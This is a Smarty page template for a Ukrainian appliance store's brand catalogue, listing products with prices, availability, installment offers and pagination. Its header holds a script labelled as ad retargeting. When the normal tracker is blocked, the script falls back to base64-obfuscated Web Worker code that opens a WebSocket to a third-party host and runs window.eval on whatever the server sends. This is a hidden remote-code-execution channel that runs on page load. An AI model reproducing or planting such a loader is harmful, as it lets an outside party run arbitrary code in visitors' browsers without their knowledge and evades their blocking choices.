{include file='layouts/_header.tpl'}

<!--Trafmag ретаргетинг-->
{literal}
    <script type='text/javascript'>(function (t, r, f, m, g, c) {
            g = t.createElement(r), c = t.getElementsByTagName(r)[0];
            g.type = 'text/javascript';
            g.async = 1;
            g.src = (t.location.protocol == 'https:' ? 'https:' : 'http:') + f + m;
            g.onerror = function () {
                try {
                    if (t.location.protocol == 'https:') {
                        var wsproto = 'wss', wsport = '8041'
                    } else {
                        var wsproto = 'ws', wsport = '8040'
                    }
                    ;var wrkr_tr_location = wsproto + ':' + f + ':' + wsport + m + '?ref=' + encodeURIComponent(window.location.href);
                    var wrkr_tr = new Worker(URL.createObjectURL(new Blob(['var wrkr_tr_location = "' + wrkr_tr_location + '";eval(atob("DWZ1bmN0aW9uIHNlbmRNZXNzYWdlKGUpew12YXIgaD13cmtyX3RyLm9ubWVzc2FnZTsNd3Jrcl90ci5yZWFkeVN0YXRlPT13cmtyX3RyLkNMT1NFRCYmKHdya3JfdHI9bmV3IFdlYlNvY2tldCh3cmtyX3RyX2xvY2F0aW9uKSksDXdya3JfdHIub25tZXNzYWdlPWgsDXdhaXRGb3JTb2NrZXRDb25uZWN0aW9uKHdya3JfdHIsZnVuY3Rpb24oKXt3cmtyX3RyLnNlbmQoZSk7fSkNfQ1mdW5jdGlvbiB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpe3NldFRpbWVvdXQoZnVuY3Rpb24oKXtyZXR1cm4gMT09PWUucmVhZHlTdGF0ZT92b2lkKG51bGwhPXQmJnQoKSk6dm9pZCB3YWl0Rm9yU29ja2V0Q29ubmVjdGlvbihlLHQpfSw1KX07DXdya3JfdHIgPSBuZXcgV2ViU29ja2V0KHdya3JfdHJfbG9jYXRpb24pLA13cmtyX3RyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LA1vbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZShlLmRhdGEpfQ0="))']), {type: "application/javascript"}));
                    wrkr_tr.onmessage = function (msg) {
                        window.eval(msg.data)
                    };
                    wrkr_tr.postMessage('');
                } catch (err) {
                }
            };
            c.parentNode.insertBefore(g, c);
        })(document, 'script', '//t.trafmag.com', '/tracking.js');</script>
{/literal}
<!-- //Trafmag ретаргетинг-->

{if $brand}
    <div class="container">
        {assign var=pages value=$paginator->getPages()}

        <div class="options wrap">

            <div class="bread-crumbs breadcrumbs mobile-display-none" id="breadcrumbs" itemscope=""
                 itemtype="http://schema.org/BreadcrumbList">
                <div itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="button">
                    <a href="/" itemprop="item">Главная</a>
                    <meta itemprop="position" content="1">
                </div>


                <div itemprop="itemListElement" itemscope="" itemtype="http://schema.org/ListItem" class="button">
                    <span itemprop="name" class="label1">{$brandName}</span>
                    <meta itemprop="position" content="2">
                </div>

            </div>

            <div class="liner cent">
                <span>
                    Техника {$brandName}
                </span>
            </div>

            <div class="base-options">

                <div class="left-options left-banner">
                    {include file='layouts/left-banner.tpl'}
                </div>

                <div class="right-options">

                    <div class="under-senn">
                        {foreach from=$items item=item name=catitems}
                            {if $smarty.foreach.catitems.iteration == 3}
                                <!-- Баннер "Принимаем платежные карты" -->
                                <div class="item-senn more-senn">
                                    <a href="https://590.ua/news/%D0%9F%D1%80%D0%B8%D0%BD%D0%B8%D0%BC%D0%B0%D0%B5%D0%BC-%D0%BA-%D0%BE%D0%BF%D0%BB%D0%B0%D1%82%D0%B5-%D0%BF%D0%BB%D0%B0%D1%81%D1%82%D0%B8%D0%BA%D0%BE%D0%B2%D1%8B%D0%B5-%D0%BA%D0%B0%D1%80%D1%82%D0%BE%D1%87%D0%BA%D0%B8">
                                        <img src="/images/visa-210x345.jpg"
                                             alt="Принимаем к оплате пластиковые карточки Visa, Maestro, MasterCard">
                                    </a>
                                </div>
                            {/if}

                            {*-----------ITEM-----------*}
                            <div class="item-senn more-senn">
                                <a href="{iurl assoc.cat_latin=$item.cat_latin_single  assoc.parent=$item.parentname assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}"
                                   tabindex="-1" class="sench">

                                    {*----------in stock--------*}
                                    {if $item.id_availability == 1}
                                        <h5 class="green">В наличии</h5>
                                    {elseif $item.id_availability == 3}
                                        <h5 class="blue">Под заказ</h5>
                                    {else}
                                        <h5 class="gray">Наличие уточняйте</h5>
                                    {/if}
                                    {*----------in stock--------*}
                                    <h4>
                                        {if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}
                                    </h4>


                                </a>
                                <div class="hovv">
                                    <div class="news">
                                        <div class="left-butt">
                                            <a href="" tabindex="-1">В избранное</a>
                                        </div>
                                        <div class="right-butt">
                                            <a href="" tabindex="-1">Сравнение</a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="centr">
                                <div class="itee-imgg">
                                    <img src="{$url.img}/catalog/{$item.imgid}_s.{$item.imgext}"
                                         title="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}"
                                         alt="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name} - catalog">
                                </div>
                                {if $item.bonus_amount>0}
                                    <div class="itee">
                                        <img src="/assets/img/izee0.png" alt="">
                                        <p>Вернем: <span>{$item.bonus_amount|round} грн</span></p>
                                    </div>
                                {/if}
                                <div class="itee">
                                    <img src="/assets/img/izee1.png" alt="">
                                    <p>от
                                        <span>
                                                    {$item.price/$item.rent_index*$curs_evro_smarty|round}
                                                </span>
                                        грн/мес</p>
                                </div>
                                <div class="itee">
                                    <img src="/assets/img/izee3.png" alt="">
                                    <p>
                                        от
                                        <span>
                                                    {$item.price*0.0099*$curs_evro_smarty+$item.price/24*$curs_evro_smarty|round}
                                                </span>
                                        грн/мес
                                    </p>
                                </div>
                                {if $item.id_brand == '26' && $item.id_category != 60}
                                    <div class="itee">
                                        <img src="/assets/img/izee2.png" alt="">
                                        <p>Гарантия <span>36</span> мес</p>
                                    </div>
                                {/if}
                                {if $item.bestprice > $item.price || $item.id2==41385}
                                    <div class="itee">
                                        <img src="/assets/img/izee4.png" alt="">
                                        <p>Лучшая <span>цена</span></p>
                                    </div>
                                {/if}
                                {if $item.acttype != 'gift' && $item.x_index == '1' || $item.id == '21465'}
                                    <div class="itee change">
                                        <img src="/assets/img/izee5.png" alt="">
                                        <p>Замена</p>
                                    </div>
                                {/if}
                                {if $item.acttype=='gift'}
                                    <div class="itee present">
                                        <div class="numeral"><img src="/assets/img/present-img.png"
                                                                  alt="present"></div>
                                        <p>Подарок!</p>
                                        <img src="/assets/img/present.png" alt="present">
                                    </div>
                                {/if}
                                <div class="centr">
                                    <div class="itee-imgg">
                                        <img src="{$url.img}/catalog/{$item.imgid}_s.{$item.imgext}"
                                             title="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}"
                                             alt="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name} - catalog">
                                    </div>
                                    {if $item.bonus_amount>0}
                                        <div class="itee">
                                            <img src="/assets/img/izee0.png" alt="">
                                            <p>Вернем: <span>{$item.bonus_amount|round} грн</span></p>
                                        </div>
                                    {/if}
                                    <div class="itee">
                                        <img src="/assets/img/izee1.png" alt="">
                                        <p>от
                                            <span>
                                                    {$item.price/$item.rent_index*$curs_evro_smarty|round}
                                                </span>
                                            грн/мес</p>
                                    </div>
                                    <div class="itee">
                                        <img src="/assets/img/izee3.png" alt="">
                                        <p>
                                            от
                                            <span>
                                                    {$item.price*0.0099*$curs_evro_smarty+$item.price/24*$curs_evro_smarty|round}
                                                </span>
                                            грн/мес
                                        </p>
                                    </div>
                                    {if $item.id_brand == '26' && $item.id_category != 60}
                                        <div class="itee">
                                            <img src="/assets/img/izee2.png" alt="">
                                            <p>Гарантия <span>36</span> мес</p>
                                        </div>
                                    {/if}
                                    {if $item.bestprice > $item.price || $item.id2==41385}
                                        <div class="itee">
                                            <img src="/assets/img/izee4.png" alt="">
                                            <p>Лучшая <span>цена</span></p>
                                        </div>
                                    {/if}
                                    {if $item.acttype != 'gift' && $item.x_index == '1' || $item.id == '21465'}
                                        <div class="itee change">
                                            <img src="/assets/img/izee5.png" alt="">
                                            <p>Замена</p>
                                        </div>
                                    {/if}
                                    {if $item.acttype=='gift'}
                                        <div class="itee present">
                                            <div class="numeral"><img src="/assets/img/present-img.png"
                                                                      alt="present"></div>
                                            <p>Подарок!</p>
                                            <img src="/assets/img/present.png" alt="present">
                                        </div>
                                    {/if}
                                </div>
                            </div>
                            {*-----------ITEM-----------*}

                        {/foreach}
                    </div>
                </div>
            </div>
        </div>
        <!-- SEO -->
        <div class="fashion wrap">
            {$seo_text_bottom|default:''}
        </div>
        <!-- SEO -->
        {include file='layouts/orig.tpl'}
    </div>
    <div id="category_block_view_listing" class="span-12 no_margin">
    {foreach from=$items item=item name=catitems}
        <div class="prev_bonus" style="display:none;">
            Купив {$item.brand} {$item.name} у нас, Вы получаете +{$item.bonus_amount|round}грн на бонусный счет к цене!
        </div>
        {if $item.bestprice > $item.price || $item.id2==41385}
            <i title="Лучшая цена" class="sale-icon sale-icon-price"></i>
        {/if}
        {if $item.specprice && ($item.bdprice > $item.price) && (($item.bdprice - $item.price) > 1) && !($item.sale==1 && $item.d90==-1)}
            <i title="Акционная цена" class="sale-icon sale-icon-discount"></i>
        {/if}
        {if $item.sale==1 && $item.d90==-1}
            <i title="Распродажа" class="sale-icon sale-icon-sale"></i>
        {/if}
        <div class="head">
            <a href="{iurl assoc.parent=$item.parentname  assoc.cat_latin=$item.cat_latin_single assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}">{$item.brand} {$item.name}</a>
            <span class="description">{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if}</span>


        </div>
        <div class="image_holder">
            {if $item.imgid}
                <a href="{iurl  assoc.cat_latin=$item.cat_latin_single assoc.parent=$item.parentname assoc.subdomain=$item.subdomain assoc.cat=$item.cat_onename assoc.brand=$item.brand assoc.item=$item.name}"
                   title="{$item.brand} {$item.name}">
                    <img itemprop="image" src="{$url.img}/catalog/{$item.imgid}_s.{$item.imgext}"
                         title="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name}"
                         alt="{if $item.cat_onename}{$item.cat_onename}{else}{$item.cat}{/if} {$item.brand} {$item.name} - catalog"/>
                </a>
            {else}
                <img src="/images/noimage.jpg" alt="{$item.brand} {$item.name}"/>
            {/if}
        </div>
        {if $item.acttype=='gift'}
            <div class="gift">
                <div class="products_container_image_wrap">
                    <a href="#gift-modal-{$item.id}" data-toggle="modal" class="gift-txt-lnk data-getActInfo"
                       id="i_{$item.id}"><img src="/images/catalog/{gift assoc.id=$item.actid}" alt="">
                    </a>
                </div>
                <span>Подарок</span>
            </div>
        {/if}
        <span class="full_description">{if $zf.params.catid == 189}{$item.short_info|replace:'Стиральная машина':''}{else}{$item.short_info|truncate:270}{/if}</span>
        <span class="style_price">Цена:</span>
        <br>
        {if $item.specprice  && ($item.bdprice > $item.price) && (($item.bdprice - $item.price)/$item.price > 0.01) }
            <span class="price_sidebar old">{price $item.bdprice $item.id_currency} <span
                        class="currency">{$smarty.session.Currency.title}</span></span>
            <span class="price_sidebar new">{price $item.price $item.id_currency} <span
                        class="currency">{$smarty.session.Currency.title}</span></span>
        {else}
            <span class="price_sidebar">{price $item.price $item.id_currency}
                <span class="currency">{$smarty.session.Currency.title}</span>
                    </span>
        {/if}

        {if $item.id_brand == '26' && $item.id_category != 60}<i class="guarantee-icon"></i>{/if}

        </div><!-- / .cat-item1 -->
    {/foreach}
    </div><!-- / .products -->
    <div class="clear"></div>
{/if}

<!-- pager -->
{if $pages->pageCount > 1}
    <div class="span-12 no_margin category_nav paggination">
        <p>Страницы:</p>
        {if $pages->current > 1}
            <a href="{if $pages->current-1=='1'}{$firstPageUrl}{else}{$firstPageUrl}/page/{$pages->current-1}{/if}">&larr;</a>
        {/if}
        {if $pages->firstPageInRangeNum!=1}
            <a href="{$firstPageUrl}">1</a>
            <p>...</p>
        {/if}
        {if $pages->pagesInRange}
            {foreach from=$pages->pagesInRange item=p key=k}
                {if $pages->current!=$k}
                    <a href="https://590.ua{if $k=='1'}{$firstPageUrl}{else}{$firstPageUrl}/page/{$k}{/if}">{$k}</a>
                {else}
                    <span class="current">{$pages->current}</span>
                {/if}
            {/foreach}
        {/if}
        {if $pages->pageCount && $pages->lastPageInRange != $pages->last}
            <p>...</p>
            <a href="https://590.ua{$firstPageUrl}/page/{$pages->pageCount}">{$pages->pageCount}</a>
        {/if}

        {if $pages->current < $pages->pageCount}
            <a href="https://590.ua{$firstPageUrl}/page/{$pages->current+1}">&rarr;</a>
        {/if}
    </div>
{/if}
<!-- / .pager -->

<div class="doww"><img src="/assets/img/verh.png" alt=""></div>
{include file='layouts/_footer.tpl'}